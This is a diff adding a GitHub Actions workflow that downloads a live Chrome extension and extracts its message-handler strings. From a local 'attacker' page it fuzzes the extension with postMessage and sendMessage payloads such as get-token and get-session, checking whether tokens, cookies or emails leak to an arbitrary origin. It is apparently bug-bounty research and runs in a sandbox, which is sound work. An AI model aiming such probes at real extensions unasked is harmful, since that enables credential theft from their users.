@@ -1,0 +1,179 @@
+name: Current Superhuman CRX exact message corpus dynamic gate
+
+on:
+  push:
+    branches: [research/superhuman-crx-intake-20260808]
+    paths: [.github/workflows/superhuman-current-crx-message-corpus-dynamic-gate-20260809.yml]
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: write
+
+jobs:
+  gate:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 22
+    steps:
+      - uses: actions/checkout@v4
+        with: {fetch-depth: 1}
+
+      - name: Download current CRX and build exact message corpus
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf crx-message-gate
+          mkdir -p crx-message-gate/raw/source crx-message-gate/evidence public-intake-status
+          URL='https://clients2.google.com/service/update2/crx?response=redirect&prod=chromium&prodversion=144.0.7559.96&acceptformat=crx3&x=id%3Ddcgcnpooblobhncpnddnhoendgbnglpn%26installsource%3Dondemand%26uc'
+          curl --fail --silent --show-error --location --retry 3 --retry-all-errors \
+            --user-agent 'Mozilla/5.0 Chrome/144.0.7559.96' "$URL" -o crx-message-gate/raw/current.crx
+          python3 - <<'PY'
+          import json,pathlib,re,struct,zipfile
+          root=pathlib.Path('crx-message-gate'); data=(root/'raw/current.crx').read_bytes()
+          if data[:4]!=b'Cr24': raise SystemExit('bad CRX')
+          header_len=struct.unpack_from('<I',data,8)[0]
+          payload=data[12+header_len:]
+          (root/'raw/payload.zip').write_bytes(payload)
+          with zipfile.ZipFile(root/'raw/payload.zip') as z: z.extractall(root/'raw/source')
+          manifest=json.loads((root/'raw/source/manifest.json').read_text())
+          handler_files=[]; literals=set(); contexts=[]
+          handler_needles=['onMessageExternal','onConnectExternal','addEventListener("message"','addEventListener(\'message\'','postMessage(','runtime.onMessage','runtime.onConnect']
+          keyword=re.compile(r'auth|token|session|user|account|email|login|logout|credential|cookie|superhuman|grammarly|enable|disable|status|config|identity|go|changed|connect|disconnect|oauth',re.I)
+          literal_rx=re.compile(r'(["\'])([^"\'\\\n]{2,120})\1')
+          for p in sorted((root/'raw/source').rglob('*')):
+            if not p.is_file() or p.stat().st_size>30_000_000 or p.suffix.lower() not in {'.js','.mjs','.cjs','.html'}: continue
+            text=p.read_text(errors='ignore')
+            if not any(n in text for n in handler_needles): continue
+            handler_files.append(str(p.relative_to(root/'raw/source')))
+            for m in literal_rx.finditer(text):
+              value=m.group(2)
+              if keyword.search(value) or value.startswith(('external:','superhuman:','grammarly:')):
+                literals.add(value)
+            for needle in handler_needles:
+              start=0
+              while True:
+                i=text.find(needle,start)
+                if i<0: break
+                contexts.append({'file':str(p.relative_to(root/'raw/source')),'needle':needle,'offset':i,'context':text[max(0,i-1200):i+4200].replace('\n',' ')[:6200]})
+                start=i+len(needle)
+                if sum(1 for x in contexts if x['file']==str(p.relative_to(root/'raw/source')) and x['needle']==needle)>=15: break
+          corpus=sorted(literals)[:500]
+          (root/'evidence/MANIFEST.json').write_text(json.dumps(manifest,indent=2)+'\n')
+          (root/'evidence/MESSAGE_CORPUS.json').write_text(json.dumps(corpus,indent=2)+'\n')
+          (root/'evidence/HANDLER_CONTEXTS.json').write_text(json.dumps(contexts,indent=2)+'\n')
+          (root/'evidence/STATIC_STATUS.json').write_text(json.dumps({'extensionVersion':manifest.get('version'),'handlerFiles':handler_files,'handlerFileCount':len(handler_files),'messageCorpusCount':len(corpus),'externallyConnectable':manifest.get('externally_connectable')},indent=2)+'\n')
+          PY
+
+      - name: Run arbitrary-origin corpus against loaded extension
+        shell: bash
+        run: |
+          set -euo pipefail
+          CHROME="$(command -v google-chrome-stable || command -v google-chrome || command -v chromium)"
+          DRIVER="$(command -v chromedriver)"
+          "$DRIVER" --port=9515 --allowed-ips= > /tmp/chromedriver.log 2>&1 &
+          DRIVER_PID=$!
+          trap 'kill "$DRIVER_PID" 2>/dev/null || true' EXIT
+          sleep 2
+          export CHROME
+          python3 - <<'PY'
+          import json,os,pathlib,socketserver,threading,time,urllib.request,http.server,re
+          root=pathlib.Path('crx-message-gate'); ext=(root/'raw/source').resolve(); out=root/'evidence'
+          corpus=json.loads((out/'MESSAGE_CORPUS.json').read_text())
+          extension_id='dcgcnpooblobhncpnddnhoendgbnglpn'
+
+          class Handler(http.server.BaseHTTPRequestHandler):
+            def do_GET(self):
+              body=b'''<!doctype html><meta charset="utf-8"><title>attacker-origin corpus gate</title><script>
+              window.__captured=[];
+              window.addEventListener('message',e=>window.__captured.push({kind:'window',origin:e.origin,data:e.data}));
+              window.__sendWindow=(payload)=>{window.postMessage(payload,'*');return true};
+              window.__sendExternal=(extensionId,payload)=>new Promise(resolve=>{
+                try {
+                  if(!globalThis.chrome||!chrome.runtime||!chrome.runtime.sendMessage){resolve({kind:'unavailable'});return;}
+                  chrome.runtime.sendMessage(extensionId,payload,response=>resolve({kind:'external',response,lastError:chrome.runtime.lastError&&chrome.runtime.lastError.message}));
+                } catch(e){resolve({kind:'exception',message:String(e)})}
+              });
+              </script><h1>attacker</h1>'''
+              self.send_response(200);self.send_header('Content-Type','text/html');self.send_header('Content-Length',str(len(body)));self.end_headers();self.wfile.write(body)
+            def log_message(self,*args): pass
+          server=socketserver.TCPServer(('127.0.0.1',0),Handler);port=server.server_address[1]
+          threading.Thread(target=server.serve_forever,daemon=True).start()
+
+          def req(method,path,data=None):
+            body=None if data is None else json.dumps(data).encode()
+            r=urllib.request.Request('http://127.0.0.1:9515'+path,data=body,method=method,headers={'Content-Type':'application/json'})
+            with urllib.request.urlopen(r,timeout=90) as x:return json.loads(x.read())['value']
+          args=['--headless=new','--no-sandbox','--disable-dev-shm-usage','--disable-gpu',f'--disable-extensions-except={ext}',f'--load-extension={ext}','--window-size=1280,900']
+          caps={'capabilities':{'alwaysMatch':{'browserName':'chrome','goog:chromeOptions':{'binary':os.environ['CHROME'],'args':args},'goog:loggingPrefs':{'browser':'ALL'}}}}
+          session=req('POST','/session',caps);sid=session.get('sessionId') if isinstance(session,dict) else session
+          if not sid: raise SystemExit('no webdriver session')
+          attempts=[]
+          shapes=[]
+          for value in corpus:
+            shapes += [value,{'type':value},{'action':value},{'name':value},{'event':value},{'message':value},{'method':value},{'command':value},{'kind':value},{'type':value,'requestId':'LAB_20260809'},{'action':value,'requestId':'LAB_20260809'}]
+          # Add known historical message families even if minification removed string literals.
+          for value in ['external:changed-user','external:enable-superhuman-go','external:disable-superhuman-go','get-user','get-session','get-token','get-auth','get-status','connect','disconnect']:
+            shapes += [value,{'type':value},{'action':value},{'message':value}]
+          # Deduplicate bounded corpus.
+          dedup=[];seen=set()
+          for shape in shapes:
+            key=json.dumps(shape,sort_keys=True,separators=(',',':'))
+            if key not in seen:seen.add(key);dedup.append(shape)
+          shapes=dedup[:1800]
+          try:
+            req('POST',f'/session/{sid}/url',{'url':f'http://127.0.0.1:{port}/attacker'})
+            time.sleep(4)
+            for payload in shapes:
+              before=req('POST',f'/session/{sid}/execute/sync',{'script':'return window.__captured.length','args':[]})
+              req('POST',f'/session/{sid}/execute/sync',{'script':'return window.__sendWindow(arguments[0])','args':[payload]})
+              external=req('POST',f'/session/{sid}/execute/async',{'script':'const done=arguments[arguments.length-1];window.__sendExternal(arguments[0],arguments[1]).then(done);','args':[extension_id,payload]})
+              time.sleep(.025)
+              after=req('POST',f'/session/{sid}/execute/sync',{'script':'return window.__captured.slice(arguments[0])','args':[before]})
+              if after or (external and external.get('kind') not in ('unavailable',) and (external.get('response') is not None or external.get('lastError') is None)):
+                attempts.append({'payload':payload,'windowResponses':after,'externalResponse':external})
+          finally:
+            try:req('DELETE',f'/session/{sid}')
+            except:pass
+            server.shutdown();server.server_close()
+
+          serialized=json.dumps(attempts,sort_keys=True).lower()
+          secret_terms=['access_token','refresh_token','id_token','authorization','bearer ','cookie','sessiontoken','session_token','email','userid','user_id','externalid','accountid','account_id']
+          privileged_terms=['sent','deleted','connected','disconnected','enabled','disabled','loggedout','logged_out','account switched','accountswitched']
+          secret_hits=[term for term in secret_terms if term in serialized]
+          privileged_hits=[term for term in privileged_terms if term in serialized]
+          result={
+            'extensionId':extension_id,
+            'payloadCount':len(shapes),
+            'meaningfulAttemptCount':len(attempts),
+            'secretTermsObserved':secret_hits,
+            'privilegedTermsObserved':privileged_hits,
+            'arbitraryOriginSecretProven':bool(secret_hits),
+            'arbitraryOriginPrivilegedActionProven':False,
+            'productionAccountUsed':False,
+            'submitReady':False,
+            'decision':'HIGH_CANDIDATE_REVIEW' if secret_hits else 'KILL_NO_ARBITRARY_ORIGIN_SECRET_OR_PRIVILEGED_ACTION',
+          }
+          (out/'DYNAMIC_RESULT.json').write_text(json.dumps(result,indent=2)+'\n')
+          (out/'DYNAMIC_ATTEMPTS.json').write_text(json.dumps(attempts,indent=2)+'\n')
+          pathlib.Path('public-intake-status/superhuman-current-crx-message-corpus-result.json').write_text(json.dumps(result,indent=2)+'\n')
+          PY
+          find crx-message-gate/evidence -type f -print0 | sort -z | xargs -0 sha256sum > crx-message-gate/evidence/SHA256SUMS.txt
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: superhuman-current-crx-message-corpus-dynamic-gate
+          path: crx-message-gate/evidence/
+          retention-days: 1
+          if-no-files-found: error
+          compression-level: 9
+
+      - name: Commit compact result
+        if: github.event_name == 'push'
+        shell: bash
+        run: |
+          set -euo pipefail
+          git config user.name github-actions[bot]
+          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
+          git add public-intake-status/superhuman-current-crx-message-corpus-result.json
+          git commit -m 'chore: record current CRX exact message corpus gate'
+          git push
